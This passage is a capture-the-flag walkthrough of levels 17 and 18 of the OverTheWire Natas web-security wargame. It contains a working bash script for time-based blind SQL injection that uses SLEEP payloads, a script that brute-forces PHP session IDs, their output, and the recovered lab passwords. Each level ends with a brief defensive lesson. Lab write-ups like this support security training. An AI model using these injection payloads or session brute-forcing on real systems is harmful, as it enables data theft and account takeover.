[+] EqjHJbo7LFNb8vwhHb9 (19/32)
[+] EqjHJbo7LFNb8vwhHb9s (20/32)
[+] EqjHJbo7LFNb8vwhHb9s7 (21/32)
[+] EqjHJbo7LFNb8vwhHb9s75 (22/32)
[+] EqjHJbo7LFNb8vwhHb9s75h (23/32)
[+] EqjHJbo7LFNb8vwhHb9s75ho (24/32)
[+] EqjHJbo7LFNb8vwhHb9s75hok (25/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh (26/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5 (27/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5T (28/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF (29/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0 (30/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0O (31/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC (32/32)
[✔] Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

And the password for natas17 is `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`.

#### The Lesson

Don't rely on blacklisting certain characters for security!
(Command substitution using `$(...)` was still possible.)

### Level 17

- **Date**: 2026-04-01
- **URL**: `http://natas17.natas.labs.overthewire.org`
- **Password**: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
- **Tools**: Web Browser, `SQL`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Notice that the output messages have been removed, so we can't rely on blind SQL injection based on response content anymore.

Can we somehow know if the query executed successfully or not?

But what if we use **time**?

In SQL, the `SLEEP()` function can be used to delay execution.

Put `natas18" AND SLEEP(5) --` as the username and submit the form.

- If the page takes 5 seconds to load, it means the query executed successfully and the user exists!
- If the page loads immediately, it means the query did not execute successfully and the user does not exist!

And you will see that the page takes 5 seconds to load, which means the user `natas18` exists!

Now we can use `natas18" AND password LIKE BINARY "a%" AND SLEEP(5) --` to extract the password <u>character by character</u> again, but this time based on **response time** instead of response content!

Let's automate this with a script again!

[level-17\time_based_blind_sql.bash](level-17\time_based_blind_sql.bash)
```bash
#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas17.natas.labs.overthewire.org/"
AUTH="natas17:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

SLEEP_TIME=3
THRESHOLD=2500   # ms

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    # First measurement
    start=$(date +%s%3N) # Millisecond precision!

    curl -s -u $AUTH \
      --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
      "$URL" > /dev/null

    end=$(date +%s%3N) # Millisecond precision!
    elapsed=$((end - start))

    if [[ $elapsed -ge $THRESHOLD ]]; then

      # Confirm (second measurement)
      start=$(date +%s%3N)

      curl -s -u $AUTH \
        --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
        "$URL" > /dev/null

      end=$(date +%s%3N)
      elapsed2=$((end - start))

      if [[ $elapsed2 -ge $THRESHOLD ]]; then
        password+=$c
        len=${#password} # Avoid syntax error in echo.
        echo "[+] $password (${len}/32)"
        break
      fi

    fi

  done
done

echo
echo "[✔] Password: $password"
```

Run `bash level-17/time_based_blind_sql.bash EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC` and you will get:
```powershell
[+] 6 (1/32)
[+] 6O (2/32)
[+] 6OG (3/32)
[+] 6OG1 (4/32)
[+] 6OG1P (5/32)
[+] 6OG1Pb (6/32)
[+] 6OG1PbK (7/32)
[+] 6OG1PbKd (8/32)
[+] 6OG1PbKdV (9/32)
[+] 6OG1PbKdVj (10/32)
[+] 6OG1PbKdVjy (11/32)
[+] 6OG1PbKdVjyB (12/32)
[+] 6OG1PbKdVjyBl (13/32)
[+] 6OG1PbKdVjyBlp (14/32)
[+] 6OG1PbKdVjyBlpx (15/32)
[+] 6OG1PbKdVjyBlpxg (16/32)
[+] 6OG1PbKdVjyBlpxgD (17/32)
[+] 6OG1PbKdVjyBlpxgD4 (18/32)
[+] 6OG1PbKdVjyBlpxgD4D (19/32)
[+] 6OG1PbKdVjyBlpxgD4DD (20/32)
[+] 6OG1PbKdVjyBlpxgD4DDb (21/32)
[+] 6OG1PbKdVjyBlpxgD4DDbR (22/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG (23/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6 (24/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6Z (25/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZL (26/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLl (27/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC (28/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG (29/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg (30/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC (31/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ (32/32)

[✔] Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

And the password for natas18 is `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`.

#### The Lesson

Prevent **SQL injection** from leaking data via timing (`SLEEP(...)`) attacks.

### Level 18

- **Date**: 2026-04-04
- **URL**: `http://natas18.natas.labs.overthewire.org`
- **Password**: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
- **Tools**: Web Browser, `PHP`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

Notice `rand(1, $maxid)` in `createID()`. This means that there are only 640 possible session IDs!

If `$SESSION["admin"] == 1`, the page will print the password for natas19.

`session_start()` will implicitly call `session_id()` to get the session ID from the `PHPSESSID` cookie, and then load the corresponding session file.

So we can just try all possible session IDs from 1 to 640 and see if any of them have `admin` set to 1!

Let's automate this with a script again!

[level-18\session_bruteforce.bash](level-18\session_bruteforce.bash)
```bash
#!/bin/bash

URL="http://natas18.natas.labs.overthewire.org/"
USER="natas18"
PASS="$1"

if [ -z "$PASS" ]; then
    echo "Usage: $0 <password>"
    exit 1
fi

for i in $(seq 1 640); do
    echo -ne "[*] Testing session $i/640\r"

    RESPONSE=$(curl -s -u "$USER:$PASS" --cookie "PHPSESSID=$i" "$URL")

    if echo "$RESPONSE" | grep -q "You are an admin"; then
        echo
        echo "[+] Found admin session: $i"
        echo "$RESPONSE"
        exit 0
    fi
done

echo
echo "[-] No admin session found"
```

Run `bash level-18/session_bruteforce.bash 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ` and you will get:
```powershell
[*] Testing session 119/640
[+] Found admin session: 119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And the password for natas19 is `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`.

#### The Lesson

Don't use **predictable session IDs**! (And really do use proper authentication methods instead of this custom one.)

### Level 19

- **Date**: 2026-04-04
- **URL**: `http://natas19.natas.labs.overthewire.org`
- **Password**: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
- **Tools**: Web Browser, `PHP`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html